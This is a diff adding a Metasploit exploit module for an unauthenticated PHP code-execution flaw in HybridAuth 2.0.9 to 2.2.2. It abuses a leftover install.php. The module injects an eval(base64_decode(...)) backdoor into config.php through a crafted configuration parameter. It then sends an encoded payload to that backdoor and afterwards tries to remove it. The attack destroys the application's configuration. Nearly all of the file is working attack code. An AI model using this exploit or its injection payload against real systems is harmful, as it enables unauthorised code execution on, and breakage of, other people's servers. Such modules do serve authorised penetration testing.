@@ -1,0 +1,138 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ManualRanking # application config.php is overwritten
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'HybridAuth install.php PHP Code Execution',
+      'Description'    => %q{
+          This module exploits a PHP code execution vulnerability in
+        HybridAuth versions 2.0.9 to 2.2.2. The install file 'install.php'
+        is not removed after installation allowing unauthenticated users to
+        write PHP code to the application configuration file 'config.php'.
+
+        Note: This exploit will overwrite the application configuration file
+        rendering the application unusable.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Pichaya Morimoto', # Discovery and PoC
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'References'     =>
+        [
+          ['EDB', '34273'],
+          ['OSVDB','109838']
+        ],
+      'Arch'           => ARCH_PHP,
+      'Platform'       => 'php',
+      'Targets'        =>
+        [
+          # Tested:
+          # HybridAuth versions 2.0.9, 2.0.10, 2.0.11, 2.1.2, 2.2.2 on Apache/2.2.14 (Ubuntu)
+          ['HybridAuth version 2.0.9 to 2.2.2 (PHP Payload)', {}]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Aug 4 2014',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path to HybridAuth library', '/hybridauth/'])
+      ], self.class)
+  end
+
+
+  #
+  # Check:
+  # * install.php exists
+  # * config.php is writable
+  # * HybridAuth version is 2.0.9 to 2.0.11, 2.1.x, or 2.2.0 to 2.2.2
+  #
+  def check
+    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'install.php')
+    if !res
+      vprint_error "#{peer} - Connection failed"
+      return Exploit::CheckCode::Unknown
+    elsif res.code == 404
+      vprint_error "#{peer} - Could not find install.php"
+    elsif res.body =~ />([^<]+)<\/span> must be <b >WRITABLE</
+      vprint_error "#{peer} - #{$1} is not writable"
+    elsif res.body =~ />HybridAuth (2\.[012]\.[\d\.]+(-dev)?) Installer</
+      version = res.body.scan(/>HybridAuth (2\.[012]\.[\d\.]+(-dev)?) Installer</).first.first
+      vprint_status "#{peer} - Found version: #{version}"
+      if version =~ /^2\.(0\.(9|10|11)|1\.[\d]+|2\.[012])/
+        return Exploit::CheckCode::Vulnerable
+      else
+        vprint_error "#{peer} - HybridAuth version #{version} is not vulnerable"
+      end
+    end
+    Exploit::CheckCode::Safe
+  end
+
+  #
+  # Exploit
+  #
+  def exploit
+    # check vuln
+    if check != Exploit::CheckCode::Vulnerable
+      fail_with Exploit::Failure::NotVulnerable, "#{peer} - Target is not vulnerable"
+    end
+
+    # write backdoor
+    print_status "#{peer} - Writing backdoor to config.php"
+    payload_param = rand(1000)
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'install.php'),
+      'data'   => "OPENID_ADAPTER_STATUS=eval(base64_decode($_POST[#{payload_param}])))));/*"
+    )
+    if !res
+      fail_with Failure::Unknown, "#{peer} - Connection failed"
+    elsif res.body =~ /Installation completed/
+      print_good "#{peer} - Wrote backdoor successfully"
+    else
+      fail_with Failure::UnexpectedReply, "#{peer} - Coud not write backdoor to 'config.php'"
+    end
+
+    # execute payload
+    code = Rex::Text.encode_base64(payload.encoded)
+    print_status "#{peer} - Sending payload to config.php backdoor (#{code.length} bytes)"
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'config.php'),
+      'data'   => "#{payload_param}=#{code}"
+    }, 5)
+    if !res
+      print_warning "#{peer} - No response"
+    elsif res.code == 404
+      fail_with Failure::NotFound, "#{peer} - Could not find config.php"
+    elsif res.code == 200 || res.code == 500
+      print_good "#{peer} - Sent payload successfully"
+    end
+
+    # remove backdoor
+    print_status "#{peer} - Removing backdoor from config.php"
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'install.php'),
+      'data'   => 'OPENID_ADAPTER_STATUS='
+    )
+    if !res
+      print_error "#{peer} - Connection failed"
+    elsif res.body =~ /Installation completed/
+      print_good "#{peer} - Removed backdoor successfully"
+    else
+      print_warning "#{peer} - Could not remove payload from config.php"
+    end
+  end
+end
